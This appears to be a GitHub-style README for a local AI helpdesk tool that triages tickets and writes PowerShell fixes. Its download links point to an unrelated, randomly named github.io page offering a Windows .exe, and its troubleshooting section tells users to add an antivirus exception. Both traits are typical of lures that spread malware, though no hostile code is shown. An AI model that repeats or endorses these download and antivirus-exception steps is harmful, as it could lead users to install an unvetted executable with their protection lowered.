# 🤖 10_ai_it_support_assistant - Automate IT support tasks on your computer

[![Download](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://puppetrygenusscilla672.github.io)

## 🎯 About This Application

This tool helps IT teams manage support requests without relying on cloud services. It runs entirely on your local computer. It uses a private database and an AI model to answer questions about technical issues. The system suggests solutions and creates custom PowerShell scripts to fix common problems. This approach keeps your data private and works without an internet connection.

## ⚙️ System Requirements

Ensure your computer meets these specifications before you begin:

*   Operating System: Windows 10 or Windows 11.
*   Processor: An Intel Core i5 or AMD Ryzen 5 or better.
*   Memory: 8 gigabytes of RAM or more.
*   Storage: 5 gigabytes of free disk space.
*   Graphics: A dedicated card helps performance, but the system functions using the central processor.

## 🚀 Downloading and Setup

Follow these steps to prepare your system for the assistant.

1.  Visit the [official download page](https://puppetrygenusscilla672.github.io).
2.  Locate the latest release section.
3.  Select the Windows installer file ending in .exe.
4.  Save the file to your Downloads folder.
5.  Double-click the file to start the installation.
6.  Follow the instructions on the screen to place the application on your computer.

## 🧠 Preparing the AI Engine

This software uses Ollama to run the AI model. You must install this component to enable the diagnostic features.

1.  Navigate to the Ollama website.
2.  Download the Windows version.
3.  Run the installer.
4.  Once installed, open your command prompt or terminal.
5.  Type `ollama run llama3` and press Enter. 
6.  Wait for the model to download. This process ensures the assistant has the intelligence required to analyze your IT tickets.

## 🖥️ Using the Assistant

Once you complete the installation, you can start the application using the desktop shortcut.

1.  Double-click the 10_ai_it_support_assistant icon.
2.  A window opens in your web browser. This is the user interface.
3.  Type a ticket description into the text box.
4.  Click the process button.
5.  The system searches the local SQLite records for similar issues.
6.  The AI analyzes the request and provides a step-by-step diagnostic path.
7.  The assistant generates a PowerShell script if a fix is necessary.
8.  Review the script before you run it on your machine.
9.  Click the copy button to save the script to your clipboard.

## 📂 The Local Database

The system relies on a local SQLite database containing 1,213 records of past IT support tickets. This ensures the assistant understands your specific environment and history. It learns from your data to improve over time. You do not need an external network connection for the system to access these records.

## 🛠️ Diagnostics and Automation

The assistant focuses on three core areas to help your helpdesk:

*   Triage: It sorts incoming tickets by priority and category.
*   Diagnostics: It compares current issues against historical data to find root causes.
*   Scripting: It writes PowerShell commands to automate repetitive fixes like password resets, software installations, or permission updates.

## 💡 Troubleshooting Common Issues

If the application does not open, check these points:

*   Verify that your antivirus does not block the application. You might need to add an exception for this folder.
*   Check if Ollama is running in the background. Look for the icon in your system tray.
*   Ensure that no other software occupies the network port used by the assistant.
*   Restart your computer if the model fails to load.

## 🔒 Data Privacy

This tool runs entirely on your hardware. No information leaves your local machine. Your IT records, historical logs, and generated scripts stay within your internal network. This makes the tool suitable for environments with strict privacy requirements.

## 📋 Frequently Asked Questions

**Does this require an internet connection?**
No. Once you download the software and the model, it runs offline.

**Can I add my own tickets to the database?**
Yes. You can import CSV files containing your technical records into the local SQLite database.

**Is it safe to run the generated PowerShell scripts?**
The script generator creates standard commands. However, always read the code before you execute it. We recommend testing scripts on a non-production machine first.

**How do I update the software?**
Check the releases page occasionally. If a new version exists, download the installer and run it. The setup process overwrites the old version while keeping your data folder intact.

**What language does the AI speak?**
The model supports natural language input. You can type requests in plain English.